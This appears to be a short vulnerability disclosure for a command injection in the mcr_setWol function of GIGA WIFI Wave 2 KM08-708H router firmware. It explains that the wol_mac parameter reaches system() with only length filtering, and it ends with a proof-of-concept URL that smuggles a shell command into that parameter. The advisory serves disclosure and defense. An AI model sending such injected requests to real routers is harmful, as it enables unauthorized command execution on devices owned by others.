Affected Versions:

GIGA WIFI Wave 2 - KM08-708H - v1.1
![508244ea57bb91b1498a8d1558e9ca9c](https://github.com/user-attachments/assets/f17b2e5c-6a1c-45fd-abef-8a84d9c616d7)


Command injection:

There is a command injection vulnerability in the function mcr_setWol. In line 9, the value of the Var variable is the wol_mac parameter, and in line 10, only length filtering is performed on Var before it is concatenated with v5 and executed directly as system, resulting in a command injection.
![12efce9c519498d624e7b7aa4c8acd1e](https://github.com/user-attachments/assets/ec8a0455-4b05-4323-9e7b-ef506dc3b64b)


Firmware Emulation Vulnerability Testing:
![3d1f21e5296e30b209e9e1112562ba64](https://github.com/user-attachments/assets/0a48011b-8070-47f5-9a04-884b1dd3d0d0)
![77e81d1c479ba0a2694e195d0fb2ebd5](https://github.com/user-attachments/assets/bbab4d01-7ce8-48d3-a1ac-e3cafc374085)


POC：
```
http://172.30.1.254:8899/goform/mcr_setWol?wol_mac=ls>/tmp/bbaa1.txt&redirect_url=/new/UserFolder/3_6_2_wakeonlan.asp
```
